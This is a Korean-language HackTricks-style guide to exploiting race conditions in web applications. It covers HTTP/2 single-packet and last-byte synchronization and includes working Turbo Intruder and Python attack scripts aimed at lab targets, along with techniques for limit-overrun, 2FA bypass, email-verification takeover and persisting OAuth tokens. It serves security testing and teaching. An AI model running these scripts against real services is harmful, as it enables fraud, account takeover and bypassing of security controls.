# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> 이 기술을 깊이 이해하려면 원문 리포트(https://portswigger.net/research/smashing-the-state-machine)를 확인하세요

## Race Condition 공격 강화

race conditions를 이용하는 주요 난관은 여러 요청이 동시에 처리되도록 보장하는 것이다. **처리 시간 차이가 매우 작아야 한다 — 이상적으로는 1ms 미만**.

다음은 요청 동기화를 위한 몇 가지 기법이다:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: 단일 TCP 연결에서 두 요청을 보낼 수 있어 네트워크 지터 영향을 줄인다. 하지만 서버 측 변동으로 인해 두 요청만으로는 일관된 race condition 익스플로잇을 보장하지 못할 수 있다.
- **HTTP/1.1 'Last-Byte Sync'**: 20~30개의 요청에서 대부분을 미리 전송하고 작은 조각만 남겨뒀다가 이를 함께 전송해 서버에 동시에 도착시키는 방식이다.

**Preparation for Last-Byte Sync** involves:

1. 스트림을 종료하지 않고 마지막 바이트를 제외한 헤더와 바디 데이터를 전송한다.
2. 초기 전송 후 100ms 동안 대기한다.
3. TCP_NODELAY를 비활성화해 Nagle's algorithm을 이용해 마지막 프레임을 배치 처리한다.
4. 연결을 워밍업하기 위해 ping을 보낸다.

이후 보류된 프레임을 전송하면 이들이 단일 패킷으로 도착해야 하며, 이는 Wireshark로 확인할 수 있다. 이 방법은 일반적으로 RC 공격에 포함되지 않는 static files에는 적용되지 않는다.

### 서버 아키텍처에 적응하기

타깃의 아키텍처를 이해하는 것이 중요하다. 프론트엔드 서버는 요청을 다르게 라우팅할 수 있어 타이밍에 영향을 준다. 중요하지 않은 요청으로 서버 측 연결을 미리 워밍업하면 요청 타이밍을 정규화할 수 있다.

#### 세션 기반 잠금 처리

PHP의 session handler와 같은 프레임워크는 세션 단위로 요청을 직렬화해 취약점을 가릴 수 있다. 각 요청에 서로 다른 세션 토큰을 사용하면 이 문제를 회피할 수 있다.

#### Rate 또는 리소스 제한 극복

연결 워밍업이 효과가 없다면, 더미 요청을 대량으로 보내 웹 서버의 rate 또는 리소스 제한으로 인한 지연을 의도적으로 유발해 서버 측 지연을 만들어 single-packet attack을 용이하게 할 수 있다.

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: 요청을 Turbo Intruder로 보낼 수 있다 (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`). 요청에서 brute force하려는 값을 **`%s`**로 바꿀 수 있다. 예: `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` 그런 다음 드롭다운에서 **`examples/race-single-packer-attack.py`**를 선택한다:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

서로 다른 값을 **전송하려는** 경우, 클립보드의 wordlist를 사용하는 다음 코드로 수정할 수 있다:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> 웹이 HTTP2를 지원하지 않고 HTTP1.1만 지원하는 경우 `Engine.THREADED` 또는 `Engine.BURP`를 `Engine.BURP2` 대신 사용하세요.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: RCE를 트리거하기 위해 먼저 1개의 endpoint에 요청을 보내고 이후 다른 여러 endpoint로 요청을 보내야 하는 경우, `race-single-packet-attack.py` 스크립트를 다음과 같이 변경할 수 있습니다:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- 또한 Burp Suite의 **Repeater**에서 새로운 '**Send group in parallel**' 옵션을 통해 사용할 수 있습니다.
- **limit-overrun**의 경우 그룹에 **same request 50 times**만 추가하면 됩니다.
- **connection warming**의 경우 그룹의 **beginning**에 웹 서버의 비정적(non static) 부분으로의 일부 **requests**를 **add**할 수 있습니다.
- 2 substates 단계에서 한 요청을 처리한 다음 다른 요청을 처리하기까지의 사이를 **delaying**하려면, 두 요청 사이에 **add extra requests between**를 추가할 수 있습니다.
- **multi-endpoint** RC의 경우 **goes to the hidden state**하는 **request**를 먼저 보내고 바로 뒤이어 **50 requests**를 보내어 **exploits the hidden state**할 수 있습니다.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: 이 스크립트의 목적은 사용자의 이메일을 변경하고 새로운 이메일의 verification token이 마지막 이메일로 도착할 때까지 지속적으로 검증을 반복하는 것입니다 (코드상에서 이메일을 변경할 수 있지만 verification이 기존 이메일로 전송되는 RC가 발생했는데, 이는 이메일을 가리키는 변수가 이미 첫 번째 이메일로 채워져 있었기 때문입니다).\
수신된 이메일에서 "objetivo"라는 단어가 발견되면 변경된 이메일의 verification token을 받은 것으로 간주하고 공격을 종료합니다.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: 엔진 및 게이팅 노트

- 엔진 선택: HTTP/2 대상에서는 `Engine.BURP2`를 사용해 single‑packet attack을 트리거하세요; HTTP/1.1 last‑byte sync에는 `Engine.THREADED` 또는 `Engine.BURP`로 폴백하세요.
- `gate`/`openGate`: `gate='race1'`(또는 시도별 gates)로 여러 복사본을 큐에 넣으면 각 요청의 tail을 보류합니다; `openGate('race1')`는 모든 tail을 함께 플러시하여 거의 동시에 도착하게 합니다.
- Diagnostics: Turbo Intruder에서 음수 타임스탬프는 요청이 완전히 전송되기 전에 서버가 응답했음을 나타내며, 이는 겹침(overlap)을 증명합니다. 이는 실제 races에서 예상되는 현상입니다.
- 연결 워밍업: 타이밍을 안정시키기 위해 먼저 ping 또는 몇 개의 무해한 요청을 보내세요; 마지막 프레임의 배칭을 유도하려면 선택적으로 `TCP_NODELAY`를 비활성화하세요.


### Single Packet Attack 개선

원래 연구에서는 이 공격이 1,500 바이트의 제한이 있다고 설명했습니다. 그러나 [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)에서는 IP 레이어 조각화(IP layer fragmentation)를 사용해 single packet attack의 1,500바이트 제한을 TCP의 **65,535 B 윈도우 제한**까지 확장하는 방법(단일 패킷을 여러 IP 패킷으로 분할하고 서로 다른 순서로 전송하여 모든 조각이 서버에 도달할 때까지 재조립을 방지)을 설명했습니다. 이 기법으로 연구자는 약 166ms에 10,000개의 요청을 전송할 수 있었습니다.

이 개선으로 수백/수천 개의 패킷이 동시에 도착해야 하는 RC에서 공격의 신뢰성이 올라가지만, 소프트웨어적 제한도 있을 수 있습니다. Apache, Nginx, Go 같은 일부 인기 HTTP 서버는 `SETTINGS_MAX_CONCURRENT_STREAMS` 값을 각각 100, 128, 250으로 엄격히 설정합니다. 반면 NodeJS와 nghttp2는 이를 무제한으로 둡니다. 즉, Apache는 단일 TCP 연결에서 100개의 HTTP 연결만 고려하므로(이 RC 공격을 제한함) 주의해야 합니다.

이 기법을 사용한 몇 가지 예제는 리포지토리 [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main)에서 확인할 수 있습니다.

## Raw BF

이전 연구 이전에는 가능한 한 빠르게 패킷을 보내 RC를 유발하려는 다음과 같은 페이로드들이 사용되었습니다.

- **Repeater:** 이전 섹션의 예제를 확인하세요.
- **Intruder**: **request**를 **Intruder**로 보내고, **Options** 메뉴에서 **number of threads**를 **30**으로 설정한 뒤, 페이로드로 **Null payloads**를 선택하고 **30**개를 생성하세요.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC 방법론**

### Limit-overrun / TOCTOU

이것은 가장 기본적인 유형의 race condition으로, 특정 동작을 수행할 수 있는 횟수를 제한하는 곳에서 **vulnerabilities**가 **발생**하는 경우입니다. 예를 들어 웹 스토어에서 동일한 할인 코드를 여러 번 사용하는 경우가 있습니다. 아주 쉬운 예는 [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) 또는 [**this bug**](https://hackerone.com/reports/759247)**.**

이 유형의 공격에는 여러 변형이 있습니다. 예를 들면:

- 기프트 카드를 여러 번 사용하는 행위
- 제품을 여러 번 평가하기
- 계좌 잔액을 초과하여 현금을 인출하거나 이체하기
- 단일 CAPTCHA 응답 재사용
- anti-brute-force rate limit 우회

### **숨겨진 하위 상태**

복잡한 race conditions를 악용하려면 숨겨진 또는 **unintended machine substates**와 상호작용할 수 있는 짧은 기회를 이용하는 경우가 많습니다. 접근 방법은 다음과 같습니다:

1. **잠재적 숨겨진 하위 상태 식별**
- 사용자 프로필이나 비밀번호 재설정(password reset) 과정처럼 중요한 데이터를 수정하거나 상호작용하는 endpoints를 먼저 찾아보세요. 중점은:
- **Storage**: 클라이언트 측에서 데이터를 처리하는 엔드포인트보다 서버 측 영속 데이터(server-side persistent data)를 조작하는 엔드포인트를 우선하세요.
- **Action**: 기존 데이터를 변경하는 작업을 찾으세요. 새 데이터를 추가하는 작업보다 취약 조건을 만들 가능성이 큽니다.
- **Keying**: 성공적인 공격은 보통 동일한 식별자(예: username 또는 reset token)를 키로 사용하는 작업에서 발생합니다.
2. **초기 탐색 수행**
- 식별한 엔드포인트를 race condition 공격으로 테스트하고 예상 결과와의 차이를 관찰하세요. 예상치 못한 응답이나 애플리케이션 동작의 변화는 vulnerability를 시사할 수 있습니다.
3. **취약점 입증**
- 취약점을 exploit하는 데 필요한 최소 요청 수(종종 두 건)로 공격을 좁히세요. 이 단계는 정밀한 타이밍이 필요하므로 여러 번 시도하거나 자동화가 필요할 수 있습니다.

### 시간 민감 공격

요청 타이밍의 정밀성은 취약점을 드러낼 수 있으며, 특히 timestamps 같은 예측 가능한 방식이 security tokens에 사용될 때 그렇습니다. 예를 들어 타임스탬프 기반으로 password reset tokens를 생성하면 동시 요청에 대해 동일한 토큰이 발급될 수 있습니다.

**악용 방법:**

- single packet attack 같은 정밀한 타이밍을 사용해 동시 password reset 요청을 하세요. 일치하는 토큰은 취약점을 의미합니다.

**예시:**

- 동시에 두 개의 password reset 토큰을 요청하고 비교하세요. 토큰이 일치하면 토큰 생성에 결함이 있음을 시사합니다.

**이 실습을 해보려면** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **을 확인하세요.**

## 숨겨진 하위 상태 사례 연구

### 결제 후 아이템 추가

이 [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) 을 확인해 상점에서 결제한 뒤 추가 항목을 결제하지 않고 얻는 방법을 확인하세요.

### 다른 이메일 인증

아이디어는 **이메일 주소를 verify하고 동시에 다른 이메일로 변경**하여 플랫폼이 변경된 새 이메일을 실제로 인증하는지 확인하는 것입니다.

### 쿠키 기반으로 이메일을 두 주소로 변경

이 [**research**](https://portswigger.net/research/smashing-the-state-machine)에 따르면 Gitlab은 이 방식으로 takeover에 취약했는데, 한 이메일의 **email verification token**을 다른 이메일로 **send**할 수 있었기 때문입니다.

**이를 시도하려면** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **을 확인하세요.**

### 숨겨진 데이터베이스 상태 / 확인 우회

데이터베이스에 정보를 추가하기 위해 **2 different writes**가 사용되는 경우, 데이터베이스에 **첫 번째 데이터만 기록된** 짧은 시간이 존재할 수 있습니다. 예를 들어 사용자 생성 시 **username**과 **password**가 먼저 **written**되고, 새 계정을 확인하는 **token**이 그 다음에 기록될 수 있습니다. 이 때문에 잠깐 동안 **계정 확인 토큰이 null**인 상태가 됩니다.

따라서 계정을 등록한 후 빈 토큰(`token=` 또는 `token[]=` 등)으로 여러 요청을 보내 즉시 계정을 확인하면, 본인이 제어하지 않는 이메일의 계정도 확인할 수 있게 될 수 있습니다.

**이를 시도하려면** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **을 확인하세요.**

### 2FA 우회

다음 pseudo-code는 세션 생성 중 아주 짧은 시간 동안 **2FA가 적용되지 않는** 경우가 있어 race condition에 취약합니다:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 영구 지속성

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). 이러한 서비스는 애플리케이션을 생성하고 해당 provider에 등록된 사용자를 인증할 수 있게 해줍니다. 이를 위해, **client**는 **permit your application**을 통해 **OAUth provider** 내부의 일부 데이터에 접근할 수 있도록 허용받아야 합니다.  
즉, 여기까지는 google/linkedin/github... 등의 일반 로그인과 같으며, "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_" 라는 페이지가 표시됩니다.

#### Race Condition in `authorization_code`

The **문제**는 당신이 **수락하면** 자동으로 악성 애플리케이션에 **`authorization_code`**를 전송한다는 점에서 발생합니다. 그런 다음, 이 **application abuses a Race Condition in the OAUth service provider to generate more that one AT/RT** (_Authentication Token/Refresh Token_) from the **`authorization_code`** for your account. 기본적으로, 애플리케이션이 당신의 데이터 접근을 허용받은 사실을 악용해 **여러 계정을 생성**합니다. 이후 사용자가 애플리케이션의 데이터 접근을 중지하더라도, 한 쌍의 AT/RT는 삭제되더라도 다른 토큰들은 여전히 유효할 수 있습니다.

#### Race Condition in `Refresh Token`

한번 유효한 RT를 **obtained a valid RT** 하면, 이를 악용해 여러 AT/RT를 생성할 수 있으며, 사용자가 악성 애플리케이션에 대한 권한을 취소하더라도 여러 RT가 여전히 유효하게 남을 수 있습니다.

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC)에서 Java로 웹소켓 메시지를 **parallel**로 전송하여 Web Sockets에서도 **Race Conditions**를 악용하는 PoC를 찾을 수 있습니다.
- Burp의 WebSocket Turbo Intruder를 사용하면 **THREADED** 엔진으로 여러 WS 연결을 생성하고 페이로드를 병렬로 전송할 수 있습니다. 공식 예제에서 시작하여 동시성을 위해 `config()`(스레드 수)를 조정하세요; WS 핸들러 전반에서 서버 측 상태를 레이스할 때 단일 연결에서 배치하는 것보다 더 신뢰할 수 있는 경우가 많습니다. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
